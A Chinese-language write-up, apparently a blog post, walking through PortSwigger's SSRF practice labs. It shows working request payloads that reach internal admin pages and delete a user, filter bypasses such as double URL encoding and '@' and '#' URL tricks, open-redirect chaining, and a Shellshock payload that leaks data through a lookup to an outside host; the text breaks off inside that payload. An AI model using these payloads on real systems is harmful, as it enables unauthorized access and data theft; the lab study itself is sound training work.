href=\"#请求中的部分-URL\" class=\"headerlink\" title=\"请求中的部分 URL\"></a>请求中的部分 URL</h3><p>有时，应用程序仅将主机名或 URL 路径的一部分放入请求参数中。然后，提交的值会在服务器端合并到请求的完整 URL 中。如果该值很容易被识别为主机名或 URL 路径，那么潜在的攻击面可能很明显。但是，作为完整 SSRF 的可利用性可能会受到限制，因为您无法控制所请求的整个 URL。</p>\n<h3 id=\"数据格式中的-URL\"><a href=\"#数据格式中的-URL\" class=\"headerlink\" title=\"数据格式中的 URL\"></a>数据格式中的 URL</h3><p>一些应用程序以其规范允许包含可能由数据解析器请求的格式的 URL 的格式传输数据。一个明显的例子是 XML 数据格式，它已广泛用于 Web 应用程序中，用于将结构化数据从客户端传输到服务器。当应用程序接受 XML 格式的数据并对其进行解析时，它可能容易受到<a href=\"https://portswigger.net/web-security/xxe\">XXE 注入</a>的攻击，进而容易受到 XXE 的 SSRF 攻击。当我们查看<a href=\"https://portswigger.net/web-security/xxe\">XXE 注入</a>漏洞时，我们将更详细地介绍这一点。</p>\n<h3 id=\"通过Referer头的SSRF\"><a href=\"#通过Referer头的SSRF\" class=\"headerlink\" title=\"通过Referer头的SSRF\"></a>通过Referer头的SSRF</h3><p>一些应用程序使用跟踪访问者的服务器端分析软件。该软件经常在请求中记录 Referer 标头，因为这对于跟踪传入链接特别有用。通常，分析软件实际上会访问出现在 Referer 标头中的任何第三方 URL。这通常用于分析引用站点的内容，包括传入链接中使用的锚文本。因此，Referer 标头通常代表 SSRF 漏洞的有效攻击面。有关涉及 Referer 标头的漏洞示例，请参阅<a href=\"https://portswigger.net/web-security/ssrf/blind\">盲 SSRF 漏洞</a>。</p>\n<hr>\n<blockquote>\n<p>参考链接：</p>\n<p><a href=\"https://portswigger.net/web-security/ssrf\">Web Security Academy-SSRF</a></p>\n<p><a href=\"https://www.ddosi.org/ssrf-lab/\">portswigger ssrf lab 服务器端请求伪造靶场</a></p>\n<p><a href=\"https://websec.readthedocs.io/zh/latest/vuln/ssrf.html\">Web安全学习笔记-4.4 SSRF</a></p>\n<p><a href=\"https://www.freebuf.com/vuls/321535.html\">关于SSRF和多种绕过方式</a></p>\n<p><a href=\"https://www.cnblogs.com/kaituorensheng/p/3776527.html\">URL中“#” “？” &amp;“”号的作用</a></p>\n</blockquote>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SSRF简介\"><a href=\"#SSRF简介\" class=\"headerlink\" title=\"SSRF简介\"></a>SSRF简介</h2><p><strong>SSRF</strong>（Server-Side Request Forgery，服务器端请求伪造），漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤，导致攻击者可以传入任意的地址来让后端服务器对其发起请求，并返回对该目标地址请求的数据。因此存在SSRF漏洞的服务器通常被作为跳板机来取得外网或内网其它应用服务器的信息。</p>\n<h2 id=\"漏洞危害\"><a href=\"#漏洞危害\" class=\"headerlink\" title=\"漏洞危害\"></a>漏洞危害</h2><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>\n<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>\n<h2 id=\"常见的-SSRF-攻击\"><a href=\"#常见的-SSRF-攻击\" class=\"headerlink\" title=\"常见的 SSRF 攻击\"></a>常见的 SSRF 攻击</h2><p><strong>SSRF 攻击通常利用信任关系来升级易受攻击的应用程序的攻击并执行未经授权的操作。</strong>这些信任关系可能与服务器本身有关，也可能与同一组织内的其他后端系统有关。</p>\n<h3 id=\"针对服务器本身的SSRF攻击\"><a href=\"#针对服务器本身的SSRF攻击\" class=\"headerlink\" title=\"针对服务器本身的SSRF攻击\"></a>针对服务器本身的SSRF攻击</h3><p>在针对服务器本身的 SSRF 攻击中，攻击者诱使应用程序通过其环回网络接口向托管应用程序的服务器发出 HTTP 请求。这通常涉及提供带有主机名的 URL，例如<code>127.0.0.1</code>（指向环回适配器的保留 IP 地址）或<code>localhost</code>（同一适配器的常用名称）。</p>\n<p>例如，考虑一个购物应用程序，它允许用户查看某项商品是否在特定商店中有库存。要提供库存信息，应用程序必须查询各种后端 REST API，具体取决于相关产品和商店。该功能是通过前端 HTTP 请求将 URL 传递给相关的后端 API 端点来实现的。因此，当用户查看商品的库存状态时，他们的浏览器会发出如下请求：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1\n</code></pre>\n<p>这会导致服务器向指定的 URL 发出请求，检索库存状态并将其返回给用户。</p>\n<p>在这种情况下，攻击者可以修改请求以指定服务器本身的本地 URL。例如：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://localhost/admin\n</code></pre>\n<p>在这里，服务器将获取<code>/admin</code>URL 的内容并将其返回给用户。</p>\n<p>当然，攻击者可以直接访问<code>/admin</code>URL。但管理功能通常只有经过身份验证的合适用户才能访问。因此，直接访问 URL 的攻击者不会看到任何感兴趣的内容。但是，当对<code>/admin</code>URL 的请求来自本地机器本身时，会绕过正常的<a href=\"https://portswigger.net/web-security/access-control\">访问控制。</a>应用程序授予对管理功能的完全访问权限，因为该请求似乎来自受信任的位置。</p>\n<h3 id=\"针对其他后端系统的-SSRF-攻击\"><a href=\"#针对其他后端系统的-SSRF-攻击\" class=\"headerlink\" title=\"针对其他后端系统的 SSRF 攻击\"></a>针对其他后端系统的 SSRF 攻击</h3><p>服务器端请求伪造经常出现的另一种类型的信任关系是应用程序服务器能够与用户无法直接访问的其他后端系统进行交互。这些系统通常具有不可路由的私有 IP 地址。由于后端系统通常受到网络拓扑的保护，因此它们通常具有较弱的安全态势。在许多情况下，内部后端系统包含敏感功能，任何能够与系统交互的人无需身份验证即可访问这些功能。</p>\n<p>在前面的示例中，假设后端 URL 有一个管理界面<code> https://192.168.0.68/admin</code>。在这里，攻击者可以通过提交以下请求，利用 SSRF 漏洞访问管理界面：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://192.168.0.68/admin\n</code></pre>\n<h2 id=\"针对本地服务器的基本SSRF\"><a href=\"#针对本地服务器的基本SSRF\" class=\"headerlink\" title=\"针对本地服务器的基本SSRF\"></a>针对本地服务器的基本SSRF</h2><h3 id=\"靶场地址\"><a href=\"#靶场地址\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost\">web-security/ssrf/lab-basic-ssrf-against-localhost</a></p>\n<h3 id=\"靶场说明\"><a href=\"#靶场说明\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成这个实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<h3 id=\"实验步骤\"><a href=\"#实验步骤\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、浏览<code>/admin</code>并观察您无法直接访问管理页面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/6pzPSZRtXUT81AO.png\"></p>\n<p>2、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/PR3dI6cXVeOJsQo.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/Nu3VzDg9avWqXj2.png\"></p>\n<p>3、将<code>stockApi</code>参数中 的 URL 更改为<code>http://localhost/admin</code>。发送请求包后能看到管理界面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/v6cwAsStLm4yDRO.png\"></p>\n<p>4、读取HTML识别删除目标用户的URL，即：<code>http://localhost/admin/delete?username=carlos</code></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/Ypk2GVzy71fKm4E.png\"></p>\n<p>5、成功删除carlos用户。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/oWeSXncfQGgdxbu.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/SAGZUvFY41kD2OX.png\"></p>\n<h3 id=\"小结\"><a href=\"#小结\" class=\"headerlink\" title=\"小结\"></a>小结</h3><p>为什么应用程序会以这种方式运行，并且缺省信任来自本地计算机的请求？这可能由于各种原因而出现：</p>\n<ul>\n<li>访问控制检查可能在位于应用程序服务器前面的不同组件中实现。 <strong>当与服务器本身建立连接时，会绕过检查。</strong></li>\n<li>出于灾难恢复的目的，<strong>应用程序可能允许来自本地计算机的任何用户在不登录的情况下进行管理访问</strong>。这为管理员提供了一种在丢失凭据时恢复系统的方法。这里的假设是只有完全信任的用户会直接来自服务器本身。</li>\n<li>管理界面可能正在侦听与主应用程序不同的端口号，因此用户可能无法直接访问。</li>\n</ul>\n<p>这种信任关系（来自本地机器的请求的处理方式与普通请求不同）通常是使 SSRF 成为严重漏洞的原因。</p>\n<h2 id=\"针对其他后端系统的-SSRF-攻击-1\"><a href=\"#针对其他后端系统的-SSRF-攻击-1\" class=\"headerlink\" title=\"针对其他后端系统的 SSRF 攻击\"></a>针对其他后端系统的 SSRF 攻击</h2><h3 id=\"靶场地址-1\"><a href=\"#靶场地址-1\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system\">web-security/ssrf/lab-basic-ssrf-against-backend-system</a></p>\n<h3 id=\"靶场说明-1\"><a href=\"#靶场说明-1\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请使用库存检查功能<code>192.168.0.X</code>在端口 8080 上扫描管理界面的内部范围，然后使用它删除用户<code>carlos</code>。</p>\n<h3 id=\"实验步骤-1\"><a href=\"#实验步骤-1\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>简单点说就是上一个实验+爆破url</p>\n<p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送给 Burp Intruder。</p>\n<p>2、先清除标记，然后将<code>stockApi</code>参数中的url更改为<code>http://192.168.0.1:8080/admin</code>，并标记IP地址的最后一位，即标记“1”。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/of5wsKZhJTQilXC.png\"></p>\n<p>3、切换到 Payloads 选项，将Payload类型更改为 Numbers，并在“From”和“To”和“Step”框中分别输入 1、255 和 1。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/ihI1bAo528JYNUd.png\"></p>\n<p>4、开始攻击。单击“Status”列按状态码升序对其进行排序。您应该看到一个状态为 200 的条目，显示一个管理界面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/LUaczrjxIiBQ2gq.png\"></p>\n<p>5、现在我们知道管理地址为192.168.1.252/admin。单击此请求，将其发送到 Repeater，并将路径更改为：<code>/admin/delete?username=carlos</code>，即可删除<code>carlos</code>用户。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/QBJK1U8lwqLmP4i.png\"></p>\n<h2 id=\"常见的-SSRF-防御绕过\"><a href=\"#常见的-SSRF-防御绕过\" class=\"headerlink\" title=\"常见的 SSRF 防御绕过\"></a>常见的 SSRF 防御绕过</h2><p>通常会看到包含 SSRF 行为的应用程序以及旨在防止恶意利用的防御措施。通常，可以绕过这些防御措施。</p>\n<ul>\n<li><p>绕过基于黑名单的 SSRF防御措施</p>\n</li>\n<li><p>绕过基于白名单的SSRF防御措施</p>\n</li>\n<li><p>通过开放重定向绕过SSRF防御措施</p>\n</li>\n</ul>\n<h2 id=\"基于黑名单的SSRF防御措施绕过\"><a href=\"#基于黑名单的SSRF防御措施绕过\" class=\"headerlink\" title=\"基于黑名单的SSRF防御措施绕过\"></a>基于黑名单的SSRF防御措施绕过</h2><p>一些应用程序会阻止包含诸如<code>127.0.0.1</code>、<code>localhost</code>之类的主机名或诸如<code>/admin</code>之类的url，在这种情况下，您通常可以使用各种技术绕过过滤器：</p>\n<ul>\n<li>使用替代 IP 表示<code>127.0.0.1</code>，例如<code>2130706433</code>、<code>017700000001</code>或<code>127.1</code>。</li>\n<li>将您自己的域名解析为<code>127.0.0.1</code>. 您可以<code>spoofed.burpcollaborator.net</code>用于此目的。</li>\n<li>使用 URL 编码或大小写变体混淆被阻止的字符串。</li>\n</ul>\n<h3 id=\"靶场地址-2\"><a href=\"#靶场地址-2\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter\">web-security/ssrf/lab-ssrf-with-blacklist-filter</a></p>\n<h3 id=\"靶场说明-2\"><a href=\"#靶场说明-2\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<p>开发人员部署了两个需要绕过的SSRF 弱防御措施。</p>\n<h3 id=\"实验步骤-2\"><a href=\"#实验步骤-2\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>，观察到请求被阻止。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/9GVIfWYCJvoRl8p.png\"></p>\n<p>2、通过将 URL 更改为：<code>http://localhost/</code>,还是被防火墙拦截了!</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/gU8ZfXyls3DIM1T.png\"></p>\n<p>3、通过双 URL 编码将<code>a</code>混淆为 <code>%25%36%31</code>,此时为<code>http://loc%25%36%31lhost/</code>。防火墙未拦截，成功以管理员身份访问系统。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/DIlsn7wHzvSxGKR.png\"></p>\n<p>4、搜索管理面板url</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/bJKO8hWygCVB1a5.png\"></p>\n<p>5、访问管理面板</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/N8e7TJIXoyVauBK.png\"></p>\n<p>6、又拦截了，再次将admin中的<code>a</code>url编码两次提交,绕过防火墙!</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/wQOf8Emn6P4rdyu.png\"></p>\n<p>7、删除carlos账户</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/XfptgY2mdOKSWjz.png\"></p>\n<p>8、验证一下看是不是删除掉了，目前只剩下一个账户,成功删除carlos,实验完成.</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/N5t6hrVaTOfo42e.png\"></p>\n<h2 id=\"基于白名单的-SSRF防御措施\"><a href=\"#基于白名单的-SSRF防御措施\" class=\"headerlink\" title=\"基于白名单的 SSRF防御措施\"></a>基于白名单的 SSRF防御措施</h2><p>某些应用程序只允许匹配、或包含允许值的白名单的输入。在这种情况下，您有时可以通过利用 URL 解析中的不一致来绕过过滤器。</p>\n<p>URL 规范包含许多在实现 URL的即时解析和验证时容易被忽视的特性：</p>\n<ul>\n<li>您可以使用<code>@</code>字符 在主机名之前的 URL 中嵌入凭据。例如：<code>https://expected-host@evil-host</code></li>\n<li>您可以使用<code>#</code>字符来指示 URL 片段。例如：<code>https://evil-host#expected-host</code></li>\n<li>您可以利用 DNS 命名层次结构将所需的输入放入您控制的完全限定的 DNS 名称中。例如：<code>https://expected-host.evil-host</code></li>\n<li>您可以对字符进行 URL 编码以混淆 URL 解析代码。如果实现过滤器的代码处理 URL 编码字符的方式不同于执行后端 HTTP 请求的代码，这将特别有用。</li>\n<li>您可以一起使用这些技术的组合。</li>\n</ul>\n<h3 id=\"靶场地址-3\"><a href=\"#靶场地址-3\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter\">web-security/ssrf/lab-ssrf-with-whitelist-filter</a></p>\n<h3 id=\"靶场说明-3\"><a href=\"#靶场说明-3\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://localhost/admin</code>并删除用户<code>carlos</code>。</p>\n<p><strong>开发人员已经部署了您需要绕过的反 SSRF 防御。</strong></p>\n<h3 id=\"实验思路\"><a href=\"#实验思路\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>将<code>stockApi</code>参数中 的 URL 更改为<code>http://127.0.0.1/</code>并观察应用程序正在解析 URL、提取主机名并根据白名单对其进行验证。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/L7lOQnhRy49VAja.png\"></p>\n<p>2、将 URL 更改为<code>http://username@stock.weliketoshop.net/</code>并观察它是否被接受，这表明 URL 解析器支持嵌入式凭据。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/FZI8wMgnGbPoixC.png\"></p>\n<p>3、将<code>#</code>附加到用户名后并观察到该 URL 现在被拒绝。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/CZVYM1XjwbWRsNt.png\"></p>\n<p>4、双 URL 编码<code>#</code>为<code>%2523</code>，并观察到响应，表明服务器已经访问localhost。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/wL82XeydGsgpqUW.png\"></p>\n<p>5、改成如下url:访问到admin页面</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/13UBzIgY5oVGxvn.png\"></p>\n<p>6、要访问管理界面并删除目标用户，请将 URL 更改为：<code>http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos</code></p>\n<p><img src=\"https://s2.loli.net/2022/07/20/AhlNIv48S92Mcrm.png\"></p>\n<h2 id=\"通过开放重定向漏洞绕过的-SSRF防御\"><a href=\"#通过开放重定向漏洞绕过的-SSRF防御\" class=\"headerlink\" title=\"通过开放重定向漏洞绕过的 SSRF防御\"></a>通过开放重定向漏洞绕过的 SSRF防御</h2><p>有时可以通过利用开放重定向漏洞来绕过任何类型的基于过滤器的防御。</p>\n<p>在前面的 SSRF 示例中，假设用户提交的 URL 经过严格验证，以防止恶意利用 SSRF 行为。但是，允许 URL 的应用程序包含一个开放重定向漏洞。如果用于发出后端 HTTP 请求的 API 支持重定向，则您可以构造一个满足过滤器的 URL 并导致重定向请求到所需的后端目标。</p>\n<p>例如，假设应用程序包含一个开放重定向漏洞，其中URL如下：</p>\n<pre><code class=\"bash\">/product/nextProduct?currentProductId=6&amp;path=http://evil-user.net\n</code></pre>\n<p>返回重定向到：</p>\n<pre><code>http://evil-user.net\n</code></pre>\n<p>您可以利用开放重定向漏洞绕过URL过滤器，利用SSRF漏洞如下：</p>\n<pre><code>POST /product/stock HTTP/1.0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 118\n\nstockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&amp;path=http://192.168.0.68/admin\n</code></pre>\n<p>这个 SSRF 漏洞利用有效，因为应用程序首先验证<code>stockAPI</code>提供的URL 是否在允许的域上，它就是。然后应用程序请求提供的 URL，这会触发打开重定向。它遵循重定向，并向攻击者选择的内部 URL 发出请求。</p>\n<h3 id=\"靶场地址-4\"><a href=\"#靶场地址-4\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection\">web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection</a></p>\n<h3 id=\"靶场说明-4\"><a href=\"#靶场说明-4\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该实验室具有库存检查功能，可从内部系统获取数据。</p>\n<p>要完成实验，请更改库存检查 URL 以访问管理界面<code>http://192.168.0.12:8080/admin</code>并删除用户<code>carlos</code>。</p>\n<p>库存检查器已被限制为只能访问本地应用程序，因此您需要首先找到影响应用程序的开放重定向漏洞。</p>\n<h3 id=\"实验思路-1\"><a href=\"#实验思路-1\" class=\"headerlink\" title=\"实验思路\"></a>实验思路</h3><p>1、访问一个产品，点击“查看库存”，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>尝试篡改<code>stockApi</code>参数，观察到无法让服务器直接向不同的主机发出请求。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/DxULHK7S6ocXd9J.png\"></p>\n<p>2、点击“下一个产品”，观察<code>path</code>参数被放入重定向响应的Location头中，导致开放重定向。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/f2eQm8MokCt1xUW.png\"></p>\n<p>3、创建一个利用开放重定向漏洞的 URL，并重定向到管理界面，并将其输入到库存检查器的<code>stockApi</code>参数中。构造payload如下：</p>\n<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin\n</code></pre>\n<p>   观察库存检查器是否遵循重定向并向您显示管理页面。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/1TCabPfhIMFEZs8.png\"></p>\n<p>4、修改路径以删除目标用户：</p>\n<pre><code>/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos\n</code></pre>\n<p><img src=\"https://s2.loli.net/2022/07/20/OMnjRNU8lph9dxD.png\"></p>\n<p>成功删除carlos,完成实验。</p>\n<h2 id=\"盲-SSRF-漏洞\"><a href=\"#盲-SSRF-漏洞\" class=\"headerlink\" title=\"盲 SSRF 漏洞\"></a>盲 SSRF 漏洞</h2><p>盲 SSRF 通常更难利用，但有时会导致在服务器或其他后端组件上完全远程执行代码。</p>\n<h3 id=\"什么是盲-SSRF？\"><a href=\"#什么是盲-SSRF？\" class=\"headerlink\" title=\"什么是盲 SSRF？\"></a>什么是盲 SSRF？</h3><p>当可以诱导应用程序向提供的 URL 发出后端 HTTP 请求，但后端请求的响应未在应用程序的前端响应中返回时，就会出现盲 SSRF 漏洞。</p>\n<h3 id=\"盲-SSRF-漏洞的影响是什么？\"><a href=\"#盲-SSRF-漏洞的影响是什么？\" class=\"headerlink\" title=\"盲 SSRF 漏洞的影响是什么？\"></a>盲 SSRF 漏洞的影响是什么？</h3><p>盲 SSRF 漏洞的影响通常低于完全知情的 SSRF 漏洞，因为它们具有单向性。不能轻易利用它们从后端系统检索敏感数据，尽管在某些情况下可以利用它们来实现完整的远程代码执行。</p>\n<h3 id=\"如何发现和利用盲-SSRF-漏洞\"><a href=\"#如何发现和利用盲-SSRF-漏洞\" class=\"headerlink\" title=\"如何发现和利用盲 SSRF 漏洞\"></a>如何发现和利用盲 SSRF 漏洞</h3><p>检测盲 SSRF 漏洞最可靠的方法是使用带外 ( <a href=\"https://portswigger.net/burp/application-security-testing/oast\">OAST</a> ) 技术。这涉及尝试向您控制的外部系统触发 HTTP 请求，并监视与该系统的网络交互。</p>\n<p>使用带外技术最简单、最有效的方法是使用<a href=\"https://portswigger.net/burp/documentation/collaborator\">Burp Collaborator</a>。您可以使用<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>生成唯一的域名，将它们以有效负载的形式发送到应用程序，并监视与这些域的任何交互。如果观察到来自应用程序的传入 HTTP 请求，那么它很容易受到 SSRF 的攻击。</p>\n<pre><code>提示:\n在测试 SSRF 漏洞时，通常会观察到对提供的 Collaborator 域的 DNS 查找，但没有后续的 HTTP 请求。这通常是因为应用程序试图向域发出 HTTP 请求，这导致了初始 DNS 查找，但实际的 HTTP 请求被网络级过滤阻止。基础设施允许出站 DNS 流量是相对常见的，因为有很多目的都需要这样做，但会阻止与意外目的地的 HTTP 连接。\n</code></pre>\n<h3 id=\"带外检测的盲SSRF\"><a href=\"#带外检测的盲SSRF\" class=\"headerlink\" title=\"带外检测的盲SSRF\"></a>带外检测的盲SSRF</h3><p>简单地识别可以触发带外 HTTP 请求的盲<a href=\"https://portswigger.net/web-security/ssrf\">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>\n<h3 id=\"靶场地址-5\"><a href=\"#靶场地址-5\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection\">portswigger.net/web-security/ssrf/blind/lab-out-of-band-detection</a></p>\n<h3 id=\"靶场说明-5\"><a href=\"#靶场说明-5\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>\n<p>要解决实验室问题，请使用此功能向公共 Burp Collaborator 服务器发出 HTTP 请求。</p>\n<pre><code>注意事项:\n为了防止 Academy 平台被用于攻击第三方，我们的防火墙阻止了实验室与任意外部系统之间的交互。要解决实验室，您必须使用 Burp Collaborator 的默认公共服务器。\n</code></pre>\n<h3 id=\"实验步骤-3\"><a href=\"#实验步骤-3\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、在<a href=\"https://portswigger.net/burp/pro\">Burp Suite Professional</a>中，转到 Burp 菜单并启动<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/TDyOd8hwWrEzsZG.png\"></p>\n<p>2、单击“复制到剪贴板”以将唯一的 Burp Collaborator 有效负载复制到剪贴板。让 Burp Collaborator 客户端窗口保持打开状态。</p>\n<p><img src=\"https://s2.loli.net/2022/07/20/F47CPxqtzypruD8.png\"></p>\n<p>3、访问一个产品，在 Burp Suite 中拦截请求，并将其发送到 Burp Repeater。</p>\n<p>4、更改 Referer 标头以使用生成的 Burp Collaborator 域代替原始域。发送请求。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/GDs9g5CIfHMSYTU.png\"></p>\n<p>5、返回 Burp Collaborator 客户端窗口，然后单击“立即投票”。如果您没有看到列出的任何交互，请等待几秒钟然后重试，因为服务器端命令是异步执行的。</p>\n<p>6、您应该会看到一些由应用程序启动的 DNS 和 HTTP 交互，这些交互是您的有效负载的结果。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/34EbJzx2jr9IRWg.png\"></p>\n<h2 id=\"使用-Shellshock-利用盲SSRF\"><a href=\"#使用-Shellshock-利用盲SSRF\" class=\"headerlink\" title=\"使用 Shellshock 利用盲SSRF\"></a>使用 Shellshock 利用盲SSRF</h2><p>简单地识别可以触发带外 HTTP 请求的盲<a href=\"https://portswigger.net/web-security/ssrf\">SSRF 漏洞</a>本身并不能提供可利用的途径。由于您无法查看来自后端请求的响应，因此无法使用该行为来探索应用程序服务器可以访问的系统上的内容。但是，仍然可以利用它来探测服务器本身或其他后端系统上的其他漏洞。您可以盲目地扫描内部 IP 地址空间，发送旨在检测已知漏洞的有效负载。如果这些有效载荷还采用了盲带外技术，那么您可能会在未打补丁的内部服务器上发现一个严重漏洞。</p>\n<h3 id=\"靶场地址-6\"><a href=\"#靶场地址-6\" class=\"headerlink\" title=\"靶场地址\"></a>靶场地址</h3><p><a href=\"https://portswigger.net/web-security/ssrf/blind/lab-shellshock-exploitation\">web-security/ssrf/blind/lab-shellshock-exploitation</a></p>\n<h3 id=\"靶场说明-6\"><a href=\"#靶场说明-6\" class=\"headerlink\" title=\"靶场说明\"></a>靶场说明</h3><p>该站点使用分析软件，该软件在加载产品页面时获取Referer 标头中指定的URL。</p>\n<p>为了完成实验，请使用此功能对 8080 端口范围内的内部服务器<code>192.168.0.X</code>执行<a href=\"https://portswigger.net/web-security/ssrf/blind\">盲 SSRF</a>攻击。在盲攻击中，对内部服务器使用 Shellshock 有效负载以泄露操作系统用户的名称。</p>\n<h3 id=\"实验步骤-4\"><a href=\"#实验步骤-4\" class=\"headerlink\" title=\"实验步骤\"></a>实验步骤</h3><p>1、在<a href=\"https://portswigger.net/burp/pro\">Burp Suite Professional</a>中，从 BApp Store 安装“Collaborator Everywhere”扩展。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/g4Ye52DRaJC9LuS.png\"></p>\n<p>2、将实验室的域添加到 Burp Suite 的<a href=\"https://portswigger.net/burp/documentation/desktop/tools/target/scope\">Scope</a>，以便 Collaborator Everywhere 将其作为目标。</p>\n<p>浏览网站。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/2qsKx385czIFi9B.png\"></p>\n<p><img src=\"https://s2.loli.net/2022/07/21/a6gEIPukQ9xB4Fb.png\"></p>\n<p>3、请注意，当您加载产品页面时，它会通过 Referer 标头触发与 Burp Collaborator 的 HTTP 交互。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/qmHOIcuDAlCzax3.png\"></p>\n<p>4、观察 HTTP 交互在 HTTP 请求中包含您的 User-Agent 字符串。</p>\n<p><img src=\"https://s2.loli.net/2022/07/21/MVJ5uPreEqoHTFm.png\"></p>\n<p>5、将请求发送到产品页面给 Burp Intruder。</p>\n<p>6、使用<a href=\"https://portswigger.net/burp/documentation/desktop/tools/collaborator-client\">Burp Collaborator 客户端</a>生成唯一的 Burp Collaborator 有效负载，并将其放入以下 Shellshock 有效负载中：</p>\n<pre><code>() &#123; :; &#125;; /usr/bin/nslookup 